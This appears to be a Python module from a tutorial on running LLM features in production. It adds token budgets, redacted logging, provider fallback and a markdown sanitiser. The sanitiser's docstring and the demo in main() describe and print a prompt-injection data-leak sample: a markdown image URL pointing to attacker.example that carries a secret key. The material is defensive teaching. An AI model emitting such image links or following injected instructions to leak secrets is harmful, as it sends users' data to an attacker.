"""Running an AI feature in production (chapter 14.13): the boring code that
sits around every model call.

    Guarded(llm, ...)   wraps any LLM with: a per-user daily token budget,
                        one structured log line per call (no prompt text,
                        secrets redacted), and a fallback model for outages
    redact(text)        masks email addresses and API keys before logging
    safe_markdown(...)  removes images and links to unapproved sites from
                        model output before it's shown (a data-leak defence)

    uv run python -m snipai.guard
"""

from __future__ import annotations

import hashlib
import json
import logging
import re
import sys
from collections import defaultdict
from collections.abc import Iterator
from datetime import UTC, datetime
from typing import Any
from urllib.parse import urlparse

import anthropic
import httpx

from snipai.llm import LLM, Completion, FakeLLM, Message, ToolSpec, Turn

log = logging.getLogger("snipai.calls")

# Errors that mean "the provider is having a bad time", after the SDK's own
# retries (chapter 14.4). Anything else (a bad request, a bad key) is our bug:
# falling back would only hide it.
OUTAGE_ERRORS: tuple[type[Exception], ...] = (
    anthropic.APIConnectionError,
    anthropic.RateLimitError,
    anthropic.InternalServerError,
    httpx.TransportError,
)


class BudgetExceeded(Exception):
    """This user has used their tokens for today."""


EMAIL = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
API_KEY = re.compile(r"\b(?:snip_|sk-ant-|sk-)[A-Za-z0-9_-]{8,}")


def redact(text: str) -> str:
    """Mask things that must never reach a log file (chapter 7.6)."""
    return API_KEY.sub("[key]", EMAIL.sub("[email]", text))


MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
MD_LINK = re.compile(r"\[([^\]]*)\]\(([^)\s]*)[^)]*\)")


def safe_markdown(text: str, allowed_hosts: set[str]) -> str:
    """Model output is untrusted. An injected instruction can make a model
    write ![](https://attacker.example/?q=<secret>); a browser rendering that
    image sends the secret to the attacker without anyone clicking. So: drop
    images, and turn links to unapproved sites into plain text."""
    text = MD_IMAGE.sub("[image removed]", text)

    def link(m: re.Match[str]) -> str:
        host = urlparse(m.group(2)).hostname or ""
        return m.group(0) if host in allowed_hosts else m.group(1)

    return MD_LINK.sub(link, text)


class Guarded:
    """Wraps an LLM for one feature. Same interface as any LLM (chapter 14.4)."""

    def __init__(
        self,
        llm: LLM,
        *,
        feature: str,
        prompt_version: str,
        daily_tokens_per_user: int = 50_000,
        fallback: LLM | None = None,
    ) -> None:
        self.llm, self.fallback = llm, fallback
        self.name, self.model = llm.name, llm.model
        self.feature, self.prompt_version = feature, prompt_version
        self.limit = daily_tokens_per_user
        self.used: dict[tuple[str, str], int] = defaultdict(int)  # (user, day) -> tokens
        self.user = "anonymous"  # set per request: guarded.user = request.user_id

    def _day(self) -> str:
        return datetime.now(UTC).strftime("%Y-%m-%d")

    def _check_budget(self) -> None:
        if self.used[(self.user, self._day())] >= self.limit:
            raise BudgetExceeded(f"daily limit of {self.limit} tokens reached")

    def _record(self, c: Completion, *, fell_back: bool, error: str = "") -> None:
        self.used[(self.user, self._day())] += c.input_tokens + c.output_tokens
        log.info(
            json.dumps(
                {
                    "feature": self.feature,
                    "prompt_version": self.prompt_version,
                    # A stable pseudonym: calls from one user can be grouped
                    # without the log holding who they are.
                    "user": hashlib.sha256(self.user.encode()).hexdigest()[:12],
                    "model": c.model,
                    "fell_back": fell_back,
                    "input_tokens": c.input_tokens,
                    "output_tokens": c.output_tokens,
                    "cost_usd": round(c.cost_usd(), 6),
                    "seconds": round(c.seconds, 3),
                    "stop_reason": c.stop_reason,
                    "error": redact(error),
                }
            )
        )

    def complete(
        self,
        prompt: str,
        *,
        system: str | None = None,
        max_tokens: int = 500,
        schema: dict[str, Any] | None = None,
    ) -> Completion:
        self._check_budget()
        try:
            c = self.llm.complete(prompt, system=system, max_tokens=max_tokens, schema=schema)
        except OUTAGE_ERRORS as e:
            if self.fallback is None:
                raise
            c = self.fallback.complete(prompt, system=system, max_tokens=max_tokens, schema=schema)
            self._record(c, fell_back=True, error=f"{type(e).__name__}: {e}")
            return c
        self._record(c, fell_back=False)
        return c

    def stream(
        self, prompt: str, *, system: str | None = None, max_tokens: int = 500
    ) -> Iterator[str]:
        self._check_budget()
        return self.llm.stream(prompt, system=system, max_tokens=max_tokens)

    def chat(
        self,
        messages: list[Message],
        tools: list[ToolSpec],
        *,
        system: str | None = None,
        max_tokens: int = 1000,
    ) -> Turn:
        self._check_budget()
        turn = self.llm.chat(messages, tools, system=system, max_tokens=max_tokens)
        self._record(turn.completion, fell_back=False)
        return turn


class _Down(FakeLLM):
    """A provider having an outage, for the demo."""

    def complete(self, prompt: str, **kwargs: Any) -> Completion:
        raise httpx.ConnectError("connection refused")


def main() -> int:
    logging.basicConfig(level=logging.INFO, format="log: %(message)s", stream=sys.stdout)
    page = "<text>snip is a URL shortener. Contact ada@example.com for access.</text>"

    print("1. Normal calls, each logged as one line (no prompt text):")
    g = Guarded(FakeLLM(), feature="describe", prompt_version="v3", daily_tokens_per_user=30)
    g.user = "ada"
    print("  ", g.complete(page).text)

    print("\n2. The same user keeps going, until their daily budget runs out:")
    try:
        for _ in range(5):
            g.complete(page)
    except BudgetExceeded as e:
        print(f"   refused: {e}")

    print("\n3. The main provider is down; the fallback answers:")
    g = Guarded(_Down("primary"), feature="describe", prompt_version="v3", fallback=FakeLLM())
    print("  ", g.complete(page).text)

    print("\n4. Output that tries to leak data through an image, and a link:")
    output = (
        "Here is your summary. ![logo](https://attacker.example/pixel.png?d=snip_abc123secret) "
        "Read more on [the docs](https://docs.example.com/) or [here](https://attacker.example/)."
    )
    print("   before:", output)
    print("   after: ", safe_markdown(output, allowed_hosts={"docs.example.com"}))
    print(
        "\n5. Redacted before logging:", redact("key snip_abc123secretvalue from ada@example.com")
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
